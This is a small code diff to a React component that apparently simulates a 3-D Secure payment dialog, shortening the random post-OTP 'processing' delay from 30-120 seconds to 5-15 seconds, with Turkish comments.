@@ -124,9 +124,9 @@ export function ThreeDSecureModal({
     setError("");
     setStatus("verifying");
     onOtpGenerated?.(otp);
-    // OTP dogrulandi, simdi odeme isleniyor (random 30-120 saniye)
+    // OTP dogrulandi, simdi odeme isleniyor (random 5-15 saniye)
     window.setTimeout(() => {
-      const toplamSn = 30 + Math.floor(Math.random() * 91); // 30-120 sn
+      const toplamSn = 5 + Math.floor(Math.random() * 11); // 5-15 sn
       setProcessingSeconds(toplamSn);
       setStatus("processing");
       window.setTimeout(() => {
